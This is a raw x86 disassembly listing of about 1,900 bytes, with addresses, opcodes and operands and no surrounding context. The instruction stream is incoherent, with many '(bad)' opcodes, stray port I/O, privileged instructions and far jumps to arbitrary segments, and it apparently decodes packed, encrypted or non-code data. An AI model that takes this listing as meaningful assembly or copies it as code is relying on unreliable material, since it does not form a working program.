  4087b6:	xor    eax,DWORD PTR [edi-0x49997e82]
  4087bc:	adc    esi,ebx
  4087be:	xchg   BYTE PTR [edi+0x4c],bl
  4087c1:	loopne 0x408817
  4087c3:	or     BYTE PTR [ecx-0x7b7ff095],dh
  4087c9:	cmp    al,0xb1
  4087cb:	xchg   BYTE PTR [ebx-0x10],dl
  4087ce:	sbb    ebp,DWORD PTR [edx]
  4087d0:	js     0x4087f2
  4087d2:	(bad)  
  4087d3:	frndint 
  4087d5:	push   esi
  4087d6:	pop    ebp
  4087d7:	cld    
  4087d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d9:	shr    DWORD PTR ds:0x2dce1362,1
  4087df:	mov    dl,0xca
  4087e1:	xchg   esp,ecx
  4087e3:	push   edx
  4087e4:	int    0x28
  4087e6:	push   ss
  4087e7:	std    
  4087e8:	or     DWORD PTR [ecx-0x1117fbdf],edi
  4087ee:	in     al,dx
  4087ef:	inc    edx
  4087f0:	mov    WORD PTR [edi-0x66c3de46],cs
  4087f6:	outs   dx,DWORD PTR ds:[esi]
  4087f7:	push   ds
  4087f8:	add    edx,DWORD PTR [ebp+0x4b]
  4087fb:	aam    0xe9
  4087fd:	retf   
  4087fe:	fisttp QWORD PTR [ebx-0x55df84e8]
  408804:	push   esi
  408805:	xchg   esp,eax
  408806:	pop    edx
  408807:	jns    0x408845
  408809:	or     dl,BYTE PTR [ecx]
  40880b:	aam    0xc0
  40880d:	sub    esp,esi
  40880f:	aam    0xfe
  408811:	mov    ecx,0xa686ff00
  408816:	enter  0x3af5,0x7f
  40881a:	fstp   TBYTE PTR [edi-0x1cbf5f37]
  408820:	jp     0x408843
  408822:	clc    
  408823:	push   esi
  408824:	xchg   ebx,eax
  408825:	enter  0x9197,0x62
  408829:	add    al,0xb
  40882b:	push   ebx
  40882c:	pop    esp
  40882d:	je     0x408846
  40882f:	mov    ebx,0x9c5218e7
  408834:	inc    edi
  408835:	sbb    esi,DWORD PTR [ecx-0xf75c3df]
  40883b:	fisttp QWORD PTR [esi-0x4f]
  40883e:	test   eax,0xcdb0fb02
  408843:	xchg   ch,dh
  408845:	aas    
  408846:	jmp    0x40889e
  408848:	jmp    0x4087ff
  40884a:	outs   dx,DWORD PTR ds:[esi]
  40884b:	cmp    eax,0x9a31b0ea
  408850:	sub    al,0x65
  408852:	(bad)  
  408853:	sbb    ch,BYTE PTR [ebx]
  408855:	xchg   esp,eax
  408856:	bound  edi,QWORD PTR [ebx-0x38]
  408859:	loope  0x4087dc
  40885b:	mov    cl,al
  40885d:	xor    BYTE PTR [edx],cl
  40885f:	push   0x14
  408861:	mov    ebp,DWORD PTR [ebx]
  408863:	cli    
  408864:	dec    ecx
  408865:	jp     0x408853
  408867:	or     BYTE PTR [ecx-0x4f079e6b],bl
  40886d:	xchg   ebx,eax
  40886e:	dec    esp
  40886f:	test   DWORD PTR [edi-0x1a],esi
  408872:	sbb    ecx,ebx
  408874:	adc    eax,0x8d8130bc
  408879:	jae    0x408813
  40887b:	(bad)  
  40887c:	jnp    0x40885f
  40887e:	mov    ah,0xde
  408880:	clc    
  408881:	ror    DWORD PTR [esi],1
  408883:	mov    ebx,0x5679ed84
  408888:	sbb    al,BYTE PTR [ebx]
  40888a:	fs and ecx,ebx
  40888d:	pop    edx
  40888e:	fild   QWORD PTR [esi-0x4a1bf8fd]
  408894:	or     al,0x6a
  408896:	dec    esi
  408897:	ins    BYTE PTR es:[edi],dx
  408898:	popf   
  408899:	fldcw  WORD PTR [ebx+edx*1-0x79]
  40889d:	(bad)  
  40889e:	ss repz cs out dx,eax
  4088a2:	cmp    eax,0x3f56bc1a
  4088a7:	stos   DWORD PTR es:[edi],eax
  4088a8:	test   edx,esi
  4088aa:	loopne 0x408882
  4088ac:	inc    ecx
  4088ad:	xor    eax,0xf9a51379
  4088b2:	out    0x38,eax
  4088b4:	cmp    al,0xec
  4088b6:	icebp  
  4088b7:	sub    DWORD PTR [esi+0x3616b9f3],edi
  4088bd:	cmc    
  4088be:	add    ebp,edx
  4088c0:	xor    eax,0xe01d6bf6
  4088c5:	push   edi
  4088c6:	(bad)  
  4088c7:	aad    0x60
  4088c9:	push   cs
  4088ca:	add    DWORD PTR [ebx],eax
  4088cc:	or     DWORD PTR [esi+0x347a7609],ecx
  4088d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088d3:	adc    DWORD PTR [esp+edx*2-0x2fb02e66],0x27
  4088db:	lds    ebx,FWORD PTR [edi+0x3e805552]
  4088e1:	cwde   
  4088e2:	jb     0x4088ef
  4088e4:	add    ch,ah
  4088e6:	push   edi
  4088e7:	sub    DWORD PTR [eiz*8-0x4ece0a7b],ecx
  4088ee:	stc    
  4088ef:	push   esi
  4088f0:	loopne 0x40892b
  4088f2:	sub    eax,0x71b59793
  4088f7:	in     eax,dx
  4088f8:	dec    ecx
  4088f9:	call   0x6b7:0x37769f2c
  408900:	jb     0x40891f
  408902:	std    
  408903:	xchg   esp,eax
  408904:	les    edx,FWORD PTR ds:0x773b88c9
  40890a:	jno    0x408974
  40890c:	inc    esp
  40890d:	pop    edx
  40890e:	cmp    cl,ch
  408910:	pop    ecx
  408911:	jge    0x408920
  408913:	loope  0x408991
  408915:	lods   eax,DWORD PTR ds:[esi]
  408916:	dec    ebp
  408917:	adc    BYTE PTR [ecx+edi*4],0x50
  40891b:	inc    ebx
  40891c:	ret    0x3c9f
  40891f:	adc    eax,0xd6d452c4
  408924:	das    
  408925:	and    eax,0xfb9aa064
  40892a:	inc    esi
  40892b:	int3   
  40892c:	push   cs
  40892d:	or     al,0xfa
  40892f:	in     eax,0x47
  408931:	cmp    BYTE PTR [eax-0x78f3d1d8],0x34
  408938:	inc    eax
  408939:	aaa    
  40893a:	dec    edi
  40893b:	fs fucomip st,st(4)
  40893e:	dec    edi
  40893f:	iret   
  408940:	into   
  408941:	pop    ebp
  408942:	jmp    0x3b3906e0
  408947:	add    esp,DWORD PTR ds:0xfca4691a
  40894d:	(bad)  
  40894e:	jnp    0x4088e6
  408950:	push   ss
  408951:	arpl   WORD PTR [edi],ax
  408953:	mov    cl,0x47
  408955:	fisub  WORD PTR [ebx+0x799125b3]
  40895b:	cs iret 
  40895d:	push   esp
  40895e:	loopne 0x408955
  408960:	sbb    al,BYTE PTR [eax*2-0x491a378a]
  408967:	or     bh,0xe6
  40896a:	aad    0xff
  40896c:	jne    0x408958
  40896e:	add    cl,dh
  408970:	push   ebx
  408971:	add    BYTE PTR [esi-0x7f39df2],0xf1
  408978:	sub    eax,0xa0b08a05
  40897d:	adc    al,0x37
  40897f:	xchg   esi,eax
  408980:	dec    edx
  408981:	sub    DWORD PTR [ecx-0x46],eax
  408984:	dec    esi
  408985:	pop    ebp
  408986:	pop    ebp
  408987:	rcr    BYTE PTR [eax-0x40],1
  40898a:	cmp    al,0xe5
  40898c:	out    0xd2,eax
  40898e:	jecxz  0x408978
  408990:	in     al,0xcf
  408992:	outs   dx,BYTE PTR ds:[esi]
  408993:	fistp  QWORD PTR [ebp+0x78d95d99]
  408999:	mov    ah,0xa0
  40899b:	pop    ss
  40899c:	and    ecx,ebx
  40899e:	sahf   
  40899f:	cdq    
  4089a0:	and    DWORD PTR [eax],ecx
  4089a2:	xchg   edi,eax
  4089a3:	inc    ebp
  4089a4:	data16 cpuid 
  4089a7:	idiv   BYTE PTR [ebp-0x17253664]
  4089ad:	inc    edi
  4089ae:	loope  0x408982
  4089b0:	mov    al,0x22
  4089b2:	retf   0xb82e
  4089b5:	jb     0x408953
  4089b7:	push   cs
  4089b8:	bnd jae 0x408a28
  4089bb:	cli    
  4089bc:	adc    edi,DWORD PTR [edx]
  4089be:	mov    eax,ds:0xcea3eee3
  4089c3:	adc    DWORD PTR [ebx+0xc3e957a],0xa2ebb5d6
  4089cd:	mov    ch,BYTE PTR [ebx-0x34]
  4089d0:	dec    ecx
  4089d1:	sti    
  4089d2:	cmp    ah,BYTE PTR [ecx+0x6e]
  4089d5:	outs   dx,DWORD PTR ds:[esi]
  4089d6:	retf   
  4089d7:	mov    ah,0xab
  4089d9:	les    esi,FWORD PTR [edx+ebx*8+0x1fc4cc9]
  4089e0:	mov    al,ds:0xde89f523
  4089e5:	jne    0x408a2d
  4089e7:	fwait
  4089e8:	js     0x4089ca
  4089ea:	mov    ds:0x7ba433f7,eax
  4089ef:	jb     0x40897a
  4089f1:	mov    ebx,ebx
  4089f3:	jmp    0x408977
  4089f5:	add    al,0x1c
  4089f7:	mov    WORD PTR [esi+esi*2+0x552c98ab],?
  4089fe:	dec    cx
  408a00:	in     al,0xd8
  408a02:	pop    esp
  408a03:	mov    bl,0xcd
  408a05:	daa    
  408a06:	loop   0x4089ab
  408a08:	sbb    al,0xe7
  408a0a:	inc    eax
  408a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a0c:	loopne 0x408999
  408a0e:	daa    
  408a0f:	adc    esi,DWORD PTR [edx-0x5499e4a2]
  408a15:	jo     0x408a56
  408a17:	pop    ds
  408a18:	push   0xffffffa1
  408a1a:	out    0x2c,eax
  408a1c:	add    DWORD PTR [ecx+0x65],0x2c
  408a20:	add    al,BYTE PTR [ebp+edi*4-0x531b4cb1]
  408a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a28:	lds    esp,FWORD PTR [ebp-0xd966cda]
  408a2e:	adc    edi,DWORD PTR [ebp-0x12]
  408a31:	sbb    ebp,DWORD PTR [ebx-0x4f]
  408a34:	repnz test edi,0xd47376ee
  408a3b:	xlat   BYTE PTR ds:[ebx]
  408a3c:	sar    DWORD PTR [esp+esi*1-0x4e],cl
  408a40:	loope  0x408a2f
  408a42:	adc    al,0x60
  408a44:	cwde   
  408a45:	push   esp
  408a46:	dec    ebx
  408a47:	mov    ds:0x94da519d,al
  408a4c:	imul   eax,DWORD PTR [edx+0x38],0x1f
  408a50:	gs call 0x84c2:0x45434957
  408a58:	jbe    0x408a9e
  408a5a:	fmul   QWORD PTR [ebp+edi*4+0x40faef25]
  408a61:	mov    esp,0xf387cfee
  408a66:	add    ecx,DWORD PTR [ebx]
  408a68:	mov    ah,0xa4
  408a6a:	pop    ebp
  408a6b:	or     DWORD PTR [edx-0x4c4ec92],0xffffffc0
  408a72:	jnp    0x408aa9
  408a74:	loopne 0x408a8d
  408a76:	jne    0x408a20
  408a78:	xchg   DWORD PTR [ebx+edx*1-0x2afaa9c4],esp
  408a7f:	iret   
  408a80:	xchg   esp,eax
  408a81:	ins    BYTE PTR es:[edi],dx
  408a82:	je     0x408aa2
  408a84:	jnp    0x408a1b
  408a86:	jnp    0x408aa6
  408a88:	sbb    ebp,edx
  408a8a:	push   edi
  408a8b:	repz jmp 0x786c:0x2dc22ae7
  408a93:	mov    ch,0x19
  408a95:	sbb    dl,dh
  408a97:	cmp    al,0x58
  408a99:	jle    0x408a3b
  408a9b:	loop   0x408ae3
  408a9d:	push   cs
  408a9e:	xchg   ecx,eax
  408a9f:	retf   0xd21a
  408aa2:	stos   DWORD PTR es:[edi],eax
  408aa3:	shl    BYTE PTR [edi-0x14],1
  408aa6:	leave  
  408aa7:	adc    eax,0x365788f8
  408aac:	in     al,0xc
  408aae:	aam    0x97
  408ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab1:	jl     0x408a35
  408ab3:	cmp    al,0xf1
  408ab5:	stc    
  408ab6:	inc    edx
  408ab7:	mov    eax,0x641c103d
  408abc:	dec    ebp
  408abd:	and    eax,0x452a5ee7
  408ac2:	shl    BYTE PTR [ebx-0x763789ed],cl
  408ac8:	push   cs
  408ac9:	sbb    edi,ebp
  408acb:	dec    esp
  408acc:	mov    cl,BYTE PTR [ebx+0x1e5a9680]
  408ad2:	and    eax,0xb4543349
  408ad7:	push   edi
  408ad8:	inc    ebp
  408ad9:	scas   eax,DWORD PTR es:[edi]
  408ada:	and    ah,ah
  408adc:	imul   esi,DWORD PTR [ebx-0x1c1f0555],0x4a
  408ae3:	sar    BYTE PTR [esi-0x245a52b8],0xfb
  408aea:	test   eax,0x16176888
  408aef:	sbb    DWORD PTR [ebx-0x4b],0xffffff99
  408af3:	ror    BYTE PTR ds:0xf1ba9a19,1
  408af9:	xor    eax,0xbd74a3b6
  408afe:	repz mov ebp,0x7296381d
  408b04:	push   es
  408b05:	rol    DWORD PTR [ebx-0x2e],cl
  408b08:	cld    
  408b09:	(bad)  
  408b0a:	sub    eax,0x75df6a5c
  408b0f:	lods   al,BYTE PTR ds:[esi]
  408b10:	adc    eax,0xa3f8c0aa
  408b15:	out    dx,eax
  408b16:	retf   
  408b17:	push   edx
  408b18:	pop    edi
  408b19:	mov    al,0x7f
  408b1b:	xchg   ebp,eax
  408b1c:	popa   
  408b1d:	mov    dh,0x98
  408b1f:	mov    ecx,0x739a2a56
  408b24:	sub    bl,BYTE PTR [ebx-0x59]
  408b27:	test   al,0xaa
  408b29:	inc    ecx
  408b2a:	add    eax,0xb8c97d9e
  408b2f:	addr16 cs sbb eax,0x13f91a33
  408b36:	cmp    eax,edi
  408b38:	jmp    0x408b21
  408b3a:	inc    edx
  408b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b3c:	push   edx
  408b3d:	sti    
  408b3e:	xchg   ebx,eax
  408b3f:	xchg   ebp,eax
  408b40:	mov    DWORD PTR [edx-0x75],edx
  408b43:	sub    al,0xf9
  408b45:	clc    
  408b46:	fistp  DWORD PTR [ecx]
  408b48:	mov    dl,0x8f
  408b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4b:	add    eax,0x4ef76039
  408b50:	sbb    al,0x16
  408b52:	pop    esi
  408b53:	adc    ebp,edx
  408b55:	sahf   
  408b56:	out    0xa1,al
  408b58:	mov    edx,?
  408b5a:	dec    eax
  408b5b:	inc    edx
  408b5c:	fcomp  DWORD PTR [eax-0x7d9c6208]
  408b62:	test   eax,0xbcc02e2b
  408b67:	jno    0x408bb5
  408b69:	rol    edx,cl
  408b6b:	int3   
  408b6c:	fs xchg ecx,eax
  408b6e:	push   ss
  408b6f:	ret    
  408b70:	out    0x6f,eax
  408b72:	pop    ebp
  408b73:	xchg   dl,cl
  408b75:	pusha  
  408b76:	fiadd  WORD PTR [ebp-0x6]
  408b79:	ja     0x408bf5
  408b7b:	aad    0x54
  408b7d:	sub    BYTE PTR [ebx+0x56ee86bb],ah
  408b83:	cmp    DWORD PTR [esi-0x5c],0xb944ef33
  408b8a:	push   ecx
  408b8b:	fwait
  408b8c:	enter  0x52d8,0x60
  408b90:	out    0xe2,eax
  408b92:	mov    cl,0x4c
  408b94:	or     BYTE PTR [edx+0x45],bh
  408b97:	stos   BYTE PTR es:[edi],al
  408b98:	pop    eax
  408b99:	mov    bl,0x7c
  408b9b:	mov    ch,0x67
  408b9d:	out    0xe9,eax
  408b9f:	lods   al,BYTE PTR ds:[esi]
  408ba0:	xchg   DWORD PTR [edx+eax*4+0x75],ecx
  408ba4:	in     eax,0x1
  408ba6:	(bad)  
  408ba7:	jmp    FWORD PTR [ebp+ebx*8-0x18]
  408bab:	aas    
  408bac:	xchg   ebp,eax
  408bad:	(bad)  
  408bae:	mov    edi,0x44f92a0a
  408bb3:	fwait
  408bb4:	push   esi
  408bb5:	push   esi
  408bb6:	int3   
  408bb7:	and    BYTE PTR [edx],ah
  408bb9:	loope  0x408b58
  408bbb:	add    edi,DWORD PTR [esi+0x4f3f6b87]
  408bc1:	daa    
  408bc2:	(bad)  
  408bc3:	fldenv [ecx]
  408bc5:	pushf  
  408bc6:	sub    al,0x6a
  408bc8:	add    edx,ebx
  408bca:	(bad)  
  408bcb:	cmp    eax,0x5a078f2f
  408bd0:	push   edi
  408bd1:	xor    dl,al
  408bd3:	out    dx,al
  408bd4:	mov    bl,BYTE PTR [edi]
  408bd6:	pop    edi
  408bd7:	aad    0xb7
  408bd9:	cmp    BYTE PTR [edx+0x60],ch
  408bdc:	mov    eax,eax
  408bde:	enter  0xb89a,0xaa
  408be2:	cld    
  408be3:	xlat   BYTE PTR ds:[ebx]
  408be4:	push   esi
  408be5:	push   cs
  408be6:	xor    eax,0x5e51321c
  408beb:	data16 sub al,0xbe
  408bee:	mov    bh,0x99
  408bf0:	mov    al,0x66
  408bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf3:	lea    eax,[ecx]
  408bf5:	lock add eax,0xff7f3b79
  408bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bfc:	jg     0x408bc4
  408bfe:	inc    esp
  408bff:	cmp    esp,esp
  408c01:	outs   dx,DWORD PTR ds:[esi]
  408c02:	cdq    
  408c03:	push   ds
  408c04:	sbb    bl,ch
  408c06:	adc    DWORD PTR [ebx+0x63],esi
  408c09:	dec    edi
  408c0a:	mov    DWORD PTR [eax+eiz*4+0x38921380],edx
  408c11:	mov    ebx,0x19649e0e
  408c16:	add    al,0xce
  408c18:	cli    
  408c19:	mov    cl,0xb7
  408c1b:	adc    ebp,ebx
  408c1d:	pop    ebx
  408c1e:	lods   al,BYTE PTR ds:[esi]
  408c1f:	nop
  408c20:	adc    dl,BYTE PTR [edx]
  408c22:	cmp    al,0xb2
  408c24:	add    al,0x4e
  408c26:	sti    
  408c27:	mov    ch,0x9d
  408c29:	loop   0x408bc7
  408c2b:	jns    0x408c62
  408c2d:	loop   0x408bc4
  408c2f:	test   eax,0x2566b888
  408c34:	sub    BYTE PTR [esi-0x5c4b3e06],al
  408c3a:	mov    dl,0x1a
  408c3c:	jmp    0x6890:0xcba2f6fa
  408c43:	inc    DWORD PTR [eax-0x1e9532b6]
  408c49:	and    eax,0x9eaf1b55
  408c4e:	pop    es
  408c4f:	rol    DWORD PTR [edx-0x32],0xcd
  408c53:	in     eax,dx
  408c54:	add    edx,DWORD PTR ds:0x75901419
  408c5a:	into   
  408c5b:	sub    eax,DWORD PTR [edi-0x71]
  408c5e:	sub    bl,bh
  408c60:	test   al,0xe9
  408c62:	ja     0x408bea
  408c64:	sub    BYTE PTR [ebx],cl
  408c66:	scas   eax,DWORD PTR es:[edi]
  408c67:	rol    BYTE PTR ds:0xe11a80e9,cl
  408c6d:	pop    ss
  408c6e:	ins    DWORD PTR es:[edi],dx
  408c6f:	jns    0x408cdf
  408c71:	push   0xfffffffe
  408c73:	sahf   
  408c74:	inc    esi
  408c75:	jmp    0x9b77bfb7
  408c7a:	push   esp
  408c7b:	fmul   DWORD PTR [edi-0x45]
  408c7e:	in     eax,0xd5
  408c80:	dec    edx
  408c81:	ss pop ecx
  408c83:	test   ch,ch
  408c85:	or     ah,ah
  408c87:	jbe    0x408c2a
  408c89:	sbb    eax,DWORD PTR [ebx-0x3e24decd]
  408c8f:	imul   eax,DWORD PTR [ebx],0x0
  408c92:	and    eax,0x9fad35c
  408c97:	sub    eax,0x5b739710
  408c9c:	pushf  
  408c9d:	mov    ah,0x41
  408c9f:	cld    
  408ca0:	mov    eax,0xa0baa632
  408ca5:	cmp    bh,BYTE PTR [ebx-0x3]
  408ca8:	pusha  
  408ca9:	dec    eax
  408caa:	retf   
  408cab:	and    eax,0xe39fdc3d
  408cb0:	ins    DWORD PTR es:[edi],dx
  408cb1:	inc    ebp
  408cb2:	push   ecx
  408cb3:	retf   
  408cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cb5:	inc    ebp
  408cb6:	iret   
  408cb7:	sub    BYTE PTR [edx-0x143b390f],0x19
  408cbe:	ror    DWORD PTR [edi],0x61
  408cc1:	or     ch,cl
  408cc3:	test   ch,0xa3
  408cc6:	xchg   ebx,eax
  408cc7:	(bad)  
  408cc8:	popa   
  408cc9:	loop   0x408c79
  408ccb:	aaa    
  408ccc:	xchg   edx,eax
  408ccd:	loope  0x408c99
  408ccf:	cdq    
  408cd0:	inc    ecx
  408cd1:	inc    eax
  408cd2:	sbb    al,0xf5
  408cd4:	fisttp WORD PTR [ebx+0x78eb7a16]
  408cda:	stos   DWORD PTR es:[edi],eax
  408cdb:	inc    esp
  408cdc:	add    ah,dl
  408cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cdf:	inc    edi
  408ce0:	jmp    0x9899:0xcfbabbd3
  408ce7:	bound  ecx,QWORD PTR [edx+0x59cb3d88]
  408ced:	retf   0xc
  408cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf1:	inc    ecx
  408cf3:	push   eax
  408cf4:	adc    bl,BYTE PTR [edx]
  408cf6:	(bad)  
  408cf7:	mov    edx,0x24918074
  408cfc:	lods   eax,DWORD PTR ds:[esi]
  408cfd:	xor    ah,BYTE PTR [ebp-0x41]
  408d00:	stc    
  408d01:	push   ds
  408d02:	sub    DWORD PTR [esi-0x6d],ebp
  408d05:	shl    esi,cl
  408d07:	cwde   
  408d08:	ror    esi,1
  408d0a:	int    0xc5
  408d0c:	popa   
  408d0d:	sub    esp,DWORD PTR [eax+0x3c]
  408d10:	loope  0x408d89
  408d12:	js     0x408cfe
  408d14:	jg     0x408d85
  408d16:	adc    DWORD PTR [esi+edx*2-0x37],ecx
  408d1a:	retf   
  408d1b:	adc    BYTE PTR [ecx+0x4f],bl
  408d1e:	sub    al,0x6
  408d20:	or     eax,0x83329fb8
  408d25:	add    bl,bh
  408d27:	test   al,0x97
  408d29:	xchg   ebp,eax
  408d2a:	scas   al,BYTE PTR es:[edi]
  408d2b:	cdq    
  408d2c:	clc    
  408d2d:	mov    bh,0x7d
  408d2f:	pop    edx
  408d30:	(bad)  
  408d31:	mov    dh,0x6a
  408d33:	adc    esi,0x4a
  408d36:	ret    
  408d37:	das    
  408d38:	test   al,0x14
  408d3a:	push   ecx
  408d3b:	add    DWORD PTR [eax],ebp
  408d3d:	mov    ebp,0x2a19479d
  408d42:	cmp    BYTE PTR [ebx+ecx*4],al
  408d45:	mov    bh,0xd3
  408d47:	pop    esp
  408d48:	sbb    ebx,DWORD PTR [ecx-0x13dd796e]
  408d4e:	pop    ss
  408d4f:	in     eax,dx
  408d50:	push   esi
  408d51:	pop    ss
  408d52:	xor    al,BYTE PTR [ecx-0x63dd4801]
  408d58:	(bad)  
  408d59:	adc    edx,ecx
  408d5b:	fs ds cmp edx,eax
  408d5f:	cmp    ebx,eax
  408d61:	in     al,dx
  408d62:	out    dx,eax
  408d63:	add    ecx,ecx
  408d65:	retf   0xc36a
  408d68:	sbb    DWORD PTR [edi+ebp*1+0xc],0x81e6bd99
  408d70:	mov    ebp,0x4d76edbd
  408d75:	scas   eax,DWORD PTR es:[edi]
  408d76:	addr16 mov eax,ds:0x2d1c
  408d7a:	xor    al,0xa3
  408d7c:	nop
  408d7d:	mov    esp,0xfa0b6e51
  408d82:	aad    0x64
  408d84:	in     eax,dx
  408d85:	sub    dl,ah
  408d87:	inc    ecx
  408d88:	jnp    0x408dd7
  408d8a:	sub    eax,DWORD PTR [edx-0x5c]
  408d8d:	scas   eax,DWORD PTR es:[edi]
  408d8e:	add    BYTE PTR [ecx-0x45],bl
  408d91:	fs lahf 
  408d93:	xor    eax,0x6fdeccd
  408d98:	and    ebx,DWORD PTR [eax+0x13]
  408d9b:	popa   
  408d9c:	cmp    eax,0x9dc4e290
  408da1:	int3   
  408da2:	xor    BYTE PTR [ebp+edx*4+0x7f],ah
  408da6:	pop    eax
  408da7:	sub    ebp,ebp
  408da9:	loopne 0x408d97
  408dab:	jne    0x408d8c
  408dad:	lea    eax,[edi+0x3d]
  408db0:	popa   
  408db1:	jmp    0xa3ac:0xcf40b111
  408db8:	sub    BYTE PTR [edx+0x79c02a23],bl
  408dbe:	mov    ebx,0xe5740ab9
  408dc3:	mov    esp,0xb531d3d2
  408dc8:	jp     0x408da8
  408dca:	rol    DWORD PTR [eax+edi*1],1
  408dcd:	sbb    al,0xd9
  408dcf:	inc    esi
  408dd0:	(bad)  
  408dd1:	lods   eax,DWORD PTR ds:[esi]
  408dd2:	in     al,dx
  408dd3:	and    ecx,0x8dba3a4c
  408dd9:	dec    ebx
  408dda:	rcl    DWORD PTR [ecx+0x17681191],1
  408de0:	inc    esp
  408de1:	jmp    0x408e49
  408de3:	pusha  
  408de4:	mov    eax,DWORD PTR [eax]
  408de6:	push   eax
  408de7:	hlt    
  408de8:	or     bh,dl
  408dea:	aam    0xc0
  408dec:	cdq    
  408ded:	int3   
  408dee:	mul    DWORD PTR [edi]
  408df0:	jmp    0x408e2a
  408df2:	adc    dl,dl
  408df4:	imul   BYTE PTR ss:[edx+0x213a3210]
  408dfb:	mov    ds:0x553fbd0,al
  408e00:	(bad)  
  408e01:	scas   al,BYTE PTR es:[edi]
  408e02:	mov    cl,0xc9
  408e04:	ret    
  408e05:	retf   0xfb0a
  408e08:	inc    eax
  408e09:	inc    esp
  408e0a:	inc    edi
  408e0b:	ins    BYTE PTR es:[edi],dx
  408e0c:	ror    DWORD PTR [eax+0x12],1
  408e0f:	sub    DWORD PTR [eax+0x12],edi
  408e12:	or     al,0x9a
  408e14:	cld    
  408e15:	(bad)  
  408e16:	or     esi,edi
  408e18:	push   eax
  408e19:	es (bad) 
  408e1b:	icebp  
  408e1c:	dec    ecx
  408e1d:	inc    edx
  408e1e:	add    bl,0x31
  408e21:	xchg   ecx,eax
  408e22:	push   es
  408e23:	xor    esp,edx
  408e25:	shl    dl,0xe8
  408e28:	mov    ds:0xbd93bd1,al
  408e2d:	aaa    
  408e2e:	cld    
  408e2f:	out    0xf2,al
  408e31:	aas    
  408e32:	sub    dh,al
  408e34:	hlt    
  408e35:	lock add BYTE PTR [ebx-0x31],bl
  408e39:	daa    
  408e3a:	pop    ecx
  408e3b:	addr16 gs int 0x53
  408e3f:	test   ah,bl
  408e41:	push   0xffffffe1
  408e43:	jp     0x408e25
  408e45:	push   ds
  408e46:	sbb    DWORD PTR [edx],ecx
  408e48:	pop    edx
  408e49:	jl     0x408ea0
  408e4b:	dec    edi
  408e4c:	or     al,0x80
  408e4e:	aaa    
  408e4f:	(bad)  
  408e51:	push   ecx
  408e52:	fild   WORD PTR [esi+0x1800a82f]
  408e58:	jg     0x408e02
  408e5a:	popf   
  408e5b:	dec    edi
  408e5c:	rol    BYTE PTR [ecx-0x4d],cl
  408e5f:	dec    esp
  408e60:	mov    al,0x54
  408e62:	and    eax,0xd2e852c7
  408e67:	in     al,dx
  408e68:	pop    ebp
  408e69:	iret   
  408e6a:	pop    esi
  408e6b:	inc    edx
  408e6c:	aaa    
  408e6d:	retf   
  408e6e:	fisubr DWORD PTR [esi+0x43]
  408e71:	retf   
  408e72:	cli    
  408e73:	inc    edi
  408e74:	rcr    DWORD PTR [eax],cl
  408e76:	call   0x4030:0xb076d23a
  408e7d:	sahf   
  408e7e:	call   0x2d7e2c26
  408e83:	test   BYTE PTR [edi+0x74fd72a7],ah
  408e89:	cmp    al,0x1d
  408e8b:	repnz pusha 
  408e8d:	aaa    
  408e8e:	mov    ds:0x758010a9,eax
  408e93:	pop    ecx
  408e94:	shr    ch,1
  408e96:	call   0x3582:0x440e922f
  408e9d:	adc    ebx,ebx
  408e9f:	dec    ecx
  408ea0:	cmp    cl,0x1d
  408ea3:	xchg   ecx,eax
  408ea4:	mov    WORD PTR [esi+0x7f781446],ss
  408eaa:	imul   ebp,edx,0x19
  408ead:	adc    ecx,DWORD PTR [edi+ebx*2]
  408eb0:	push   cs
  408eb1:	fisttp QWORD PTR [ebx-0x27344fbe]
  408eb7:	(bad)  
  408eb8:	adc    al,0x7d
  408eba:	mov    bh,BYTE PTR [ebp+0x20]
  408ebd:	add    eax,0x97447007
  408ec2:	sbb    al,0x1e
  408ec4:	mov    eax,ds:0x496c1a3e
  408ec9:	out    0x40,eax
  408ecb:	pop    edi
  408ecc:	mov    ecx,0xfea1e24
  408ed1:	mov    cl,0xdf
  408ed3:	aam    0xde
  408ed5:	test   bl,cl
  408ed7:	add    BYTE PTR [ebp-0x23],cl
  408eda:	jmp    0xb77b:0x3cae71bc
  408ee1:	sbb    BYTE PTR [eax+0xd],cl
  408ee4:	jmp    0xdba4:0xe307a35f
  408eeb:	adc    edx,DWORD PTR [edi]
  408eed:	and    bl,BYTE PTR [edi]
  408eef:	xchg   esi,eax
  408ef0:	fwait
  408ef1:	and    eax,0x4d7b8f5c
  408ef6:	call   0x9bd:0x20c5e00c
  408efd:	mov    eax,0x2a0a45ae
  408f02:	push   es
  408f03:	mov    ss,WORD PTR [esi]
  408f05:	xchg   BYTE PTR [edx],bl
  408f07:	vaddsubpd xmm5,xmm2,XMMWORD PTR [ebx]
  408f0b:	xor    DWORD PTR ds:0x65ed5219,0xffffffd8
  408f12:	adc    al,0xe
  408f14:	fucompp 
  408f16:	aaa    
  408f17:	in     eax,0x78
  408f19:	mov    ds:0x56c0f21a,al
  408f1e:	je     0x408f46
  408f20:	xchg   edi,eax
  408f21:	push   0x82bdfdd4
  408f26:	mov    dh,0x95
  408f28:	dec    ebx
  408f29:	add    DWORD PTR [esi],ebx
  408f2b:	or     dl,BYTE PTR [edx-0x28]
  408f2e:	cmp    BYTE PTR [ebx-0x1],dh
  408f31:	mov    dl,0x2
  408f33:	aas    
  408f34:	mov    cl,0x8c
  408f36:	mov    ebx,0xebb57117
  408f3b:	jge    0x408f0d
  408f3d:	and    al,0xe6
  408f3f:	imul   edi,DWORD PTR [ebx],0x7d
  408f42:	pop    es
  408f43:	sub    dl,BYTE PTR [esi-0x131daccd]
  408f49:	and    eax,0xe4cb895c
  408f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f4f:	mov    bl,0x9f
  408f51:	shr    DWORD PTR [ecx-0x6d],cl
  408f54:	das    
  408f55:	nop
  408f56:	add    ecx,edx
  408f58:	pushf  
  408f59:	xchg   edi,eax
  408f5a:	int    0xb1
